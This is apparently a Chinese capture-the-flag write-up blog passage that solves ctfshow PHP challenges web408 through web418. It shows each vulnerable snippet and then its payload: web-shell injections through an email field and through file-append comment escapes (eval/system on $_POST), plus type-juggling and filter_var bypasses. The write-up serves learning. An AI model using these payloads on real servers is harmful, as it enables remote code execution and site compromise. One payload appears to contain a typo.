alt="image-20230331160426788"></p><p>然后就可以写出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cafe::add</span><br></pre></td></tr></table></figure><h2 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 19:53:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>explode就是分割函数</strong></p><p>就是将传进来的email分割成两部分，前面是filename,后面是content</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;&lt;?=system(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.php</span><br></pre></td></tr></table></figure><p>绕过的原因是<strong>非法字符可以放在双引号里面绕过检测</strong></p><p>这里用短标签的意思是因为，不能有空格，因为有个双引号然后浏览器会把空格<a href="https://so.csdn.net/so/search?q=转义&amp;spm=1001.2101.3001.7020">转义</a>为%20，然后因为双引号包含，最后导致写不进文件</p><h2 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 20:26:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目有个替换为<code>.flag</code>也就是把flag和它前面那个字符替换为空，这就可以把emai当中前面双引号这个非法字符给替换掉，避免在php环境里面出错</p><p>@后面是不符合php语句格式的字符尝试闭合网页当中前面的<code>&lt;?php</code></p><p><strong>这就是为什么会输出@123.com的原因</strong></p><p><img src="../images/image-20230331165032665.png" alt="image-20230331165032665"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;flagsystem(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.com</span><br><span class="line">然后post数据</span><br><span class="line"><span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><p>会把”flag给替换成空，然后就会执行eval(system($_POST[1]);?&gt;)</p><p>这里执行虽然会报错，但是还是能执行的</p><h2 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/php/filter_validate_boolean.asp">参考文章</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span>;&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(‘cat flag.php’);</span><br></pre></td></tr></table></figure><p>因为就是题目的代码都是只有&lt;?php 而没有结尾，所以我们就可以通过写</p><p>?&gt;给前面代码给包含了，然后就绕过注释了，然后后面在自己加一句话木马进去到flag.php里就行了</p><p><img src="../images/image-20230331171044704.png" alt="image-20230331171044704"></p><p><img src="../images/image-20230331171032907.png" alt="image-20230331171032907"></p><p>这就是为什么不会覆盖掉原有的flag的原因</p><h2 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>原理差不多，就是绕过过滤,就是包含注释就行</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h2 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:43:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>这里的sqrt是计算平方根的意思</p><p><strong>布尔值true和任意字符串都弱相等</strong></p><p>intval($flag)    ——-&gt;   0</p><p>所以随便传个负值就行了</p><h2 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:15:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。</p><p>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0</p><p><strong>函数名、方法名、类名 不区分大小写</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?k=Getflag</span><br></pre></td></tr></table></figure><h2 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:54:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230331222734499.png" alt="image-20230331222734499"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=cft::<span class="variable constant_">flag</span></span><br></pre></td></tr></table></figure><h2 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h2><p>题目</p><p>这里下载下来题目给的php代码，然后解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf=show</span><br></pre></td></tr></table></figure><h2 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 